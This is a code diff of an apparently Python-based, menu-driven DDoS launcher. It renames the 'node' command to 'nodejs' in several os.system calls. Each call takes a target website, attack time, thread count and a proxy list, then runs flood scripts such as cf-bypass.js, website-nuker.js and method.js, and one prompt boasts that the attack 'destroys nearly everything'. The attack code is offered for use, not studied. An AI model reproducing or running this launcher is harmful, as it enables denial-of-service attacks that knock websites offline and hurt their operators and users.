@@ -170,7 +170,7 @@ while True:
         time = input("\033[31m>>> \033[39mTime \033[31m:\033[36m\033[31m")
         threads = input("\033[31m>>> \033[39mThreads \033[31m:\033[36m\033[31m")
         connections = input("\033[31m>>> \033[39mConnection \033[31m:\033[36m\033[31m")
-        cfbypassrunattack = ("node cf-bypass.js " + cfbypasswebsite + " " + time + " " + threads + " " + "proxies.txt" + " " + connections)
+        cfbypassrunattack = ("nodejs cf-bypass.js " + cfbypasswebsite + " " + time + " " + threads + " " + "proxies.txt" + " " + connections)
         os.system(cfbypassrunattack)
     if kies == "http-vip":
         os.system('clear')
@@ -193,7 +193,7 @@ while True:
     """)
         websitenukerwebsite = input("\033[31m>>> \033[39mWebsite (https://google.com)\033[31m:\033[36m\033[31m")
         timewebsitenuker = input("\033[31m>>> \033[39mTime\033[31m:\033[36m\033[31m")
-        sendattackwebsitenuker = ("node website-nuker.js " + websitenukerwebsite + " " + timewebsitenuker)
+        sendattackwebsitenuker = ("nodejs website-nuker.js " + websitenukerwebsite + " " + timewebsitenuker)
         os.system(sendattackwebsitenuker)
     if kies == "website-nuker-http":
         os.system('clear')
@@ -205,7 +205,7 @@ while True:
     """)
         websitenukerwebsitehttp = input("\033[31m>>> \033[39mWebsite (http://google.com) \033[31m:\033[36m\033[31m")
         timewebsitenukerhttp = input("\033[31m>>> \033[39mTime\033[31m:\033[36m\033[31m")
-        sendattackwebsitenukerhttp = ("node website-nuker-http.js " + websitenukerwebsitehttp + " " + timewebsitenukerhttp)
+        sendattackwebsitenukerhttp = ("nodejs website-nuker-http.js " + websitenukerwebsitehttp + " " + timewebsitenukerhttp)
         os.system(sendattackwebsitenukerhttp)
     
     if kies == "ultra-bypass":
@@ -220,7 +220,7 @@ while True:
     	ultrabypasswebsite = input("\033[31m>>> \033[39mWEBSITE (https://google.com) \033[31m:\033[36m\033[31m")
     	ultrabypasstime = input("\033[31m>>> \033[39mTIME(seconds) \033[31m:\033[36m\033[31m")
     	couldbeslow = input("\033[31m>>> \033[39mAttack could be slow. But when it starts hitting it destroys nearly everything!\033[31m:\033[36m\033[31m")
-    	sendultrabypassattack = ("node method.js " + ultrabypasswebsite + " " + ultrabypasstime + " request 5")
+    	sendultrabypassattack = ("nodejs method.js " + ultrabypasswebsite + " " + ultrabypasstime + " request 5")
     	os.system(sendultrabypassattack	)
     if kies == "homeholder":
         os.system('clear')
